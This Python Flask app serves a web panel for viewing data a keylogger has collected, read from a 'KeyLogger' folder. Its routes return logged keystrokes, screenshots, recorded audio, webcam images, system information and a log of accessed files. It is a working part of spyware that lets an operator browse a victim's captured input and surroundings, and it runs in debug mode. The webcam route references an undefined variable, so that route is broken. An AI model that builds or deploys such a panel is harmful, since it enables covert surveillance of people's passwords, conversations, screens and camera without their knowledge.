from flask import Flask, render_template, send_file, jsonify, abort
import os
import psutil

app = Flask(__name__)

# Load file paths from environment variables or configuration
file_path = os.getenv('FILE_PATH', r"D:\cyber\KeyLogger")  # Default path for demonstration
keys_info = "keyStrokefile.txt"
screenshot_info = "screenshot.png"
audio_info = "audio.wav"
log_file = "accessed_files_log.txt"
system_info_file = "syseminfo.txt"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/keystrokes')
def keystrokes():
    try:
        keystrokes_file = os.path.join(file_path, keys_info)
        if not os.path.exists(keystrokes_file):
            abort(404, description="Keystrokes file not found")
        with open(keystrokes_file, 'r') as file:
            data = file.read()
        return f"<pre>{data}</pre>"
    except Exception as e:
        app.logger.error(f"Error reading keystrokes file: {e}")
        return "Error reading keystrokes file", 500

@app.route('/screenshot')
def screenshot():
    try:
        screenshot_file = os.path.join(file_path, screenshot_info)
        if not os.path.exists(screenshot_file):
            abort(404, description="Screenshot file not found")
        return send_file(screenshot_file, mimetype='image/png')
    except Exception as e:
        app.logger.error(f"Error sending screenshot: {e}")
        return "Error sending screenshot", 500

@app.route('/audio')
def audio():
    try:
        audio_file = os.path.join(file_path, audio_info)
        if not os.path.exists(audio_file):
            abort(404, description="Audio file not found")
        return send_file(audio_file, mimetype='audio/wav')
    except Exception as e:
        app.logger.error(f"Error sending audio file: {e}")
        return "Error sending audio file", 500

@app.route('/system_info')
def system_info():
    try:
        system_info_file_path = os.path.join(file_path, system_info_file)
        if not os.path.exists(system_info_file_path):
            abort(404, description="System info file not found")
        with open(system_info_file_path, 'r') as file:
            data = file.read()
        return f"<pre>{data}</pre>"
    except Exception as e:
        app.logger.error(f"Error reading system information file: {e}")
        return "Error reading system information", 500



@app.route('/system_info_api')
def system_info_api():
    try:
        info = {
            'CPU Usage': f"{psutil.cpu_percent()}%",
            'Memory Usage': f"{psutil.virtual_memory().percent}%",
            'Disk Usage': f"{psutil.disk_usage('/').percent}%"
        }
        return jsonify(info)
    except Exception as e:
        app.logger.error(f"Error retrieving system information: {e}")
        return "Error retrieving system information", 500

@app.route('/webcam')
def webcam():
    try:
        webcam_file_path = os.path.join(file_path, webCamShot_info)
        if not os.path.exists(webcam_file_path):
            abort(404, description="Webcam image not found")
        return send_file(webcam_file_path, mimetype='image/png')
    except Exception as e:
        app.logger.error(f"Error sending webcam image: {e}")
        return "Error sending webcam image", 500

@app.route('/accessed_files')
def accessed_files():
    try:
        log_file_path = os.path.join(file_path, 'accessed_files_log.txt')
        if not os.path.exists(log_file_path):
            abort(404, description="Accessed files log not found")
        with open(log_file_path, 'r') as file:
            data = file.read()
        return f"<pre>{data}</pre>"
    except Exception as e:
        app.logger.error(f"Error reading accessed files log: {e}")
        return "Error reading accessed files log", 500
    
if __name__ == '__main__':
    app.run(debug=True)
